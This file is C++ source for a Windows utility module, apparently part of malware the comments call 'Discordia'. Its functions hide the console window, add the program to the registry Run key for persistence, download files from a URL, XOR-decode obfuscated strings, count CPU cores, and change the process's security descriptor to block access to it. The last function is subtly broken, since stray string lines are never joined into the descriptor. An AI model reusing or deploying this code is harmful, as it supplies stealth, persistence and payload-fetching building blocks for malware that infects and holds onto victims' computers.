#include "stdafx.h"
#include "Utils.h"

/* Hiding Discordia Console to User */
void Utils::HideConsole()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

/* Add file to autoload */
void Utils::Autoload(string Name, string Path)
{
	string command = "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V " + Name + " /t REG_SZ /F /D " + Path;
	system(command.c_str());
}

/* Check file exists */
bool Utils::FileExists(const char *fname)
{
	return access(fname, 0) != -1;
}

/* Download File */
void Utils::DownloadFile(wchar_t *url, wchar_t *dir)
{
	URLDownloadToFile(0, url, dir, 0, 0);
}

/* Create Dir */
void Utils::CreateDir(wchar_t *dir)
{
	CreateDirectory(dir, NULL);
}

/* CPU count getter */
int Utils::getCPU()
{
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);

	return sysinfo.dwNumberOfProcessors;
}

/* Encode Strings */
char* Utils::UnEnc(char *enc, char *key, DWORD encLen)
{
	char *unEnc = (char *)LocalAlloc(LPTR, encLen + 1);
	unEnc[encLen] = 0;
	for (DWORD i = 0; i < encLen; ++i)
		unEnc[i] = enc[i] ^ key[i % lstrlenA(key)];
	return unEnc;
}

// Win API ============================================================================

/* Deny Access to this process */
BOOL Utils::DenyAccess()
{

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	SECURITY_ATTRIBUTES sa;
	TCHAR * szSD = TEXT("D:P");
	TEXT("(D;OICI;GA;;;BG)");
	TEXT("(D;OICI;GA;;;AN)");
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
		return FALSE;

	if (!SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor))
		return FALSE;

	return TRUE;

}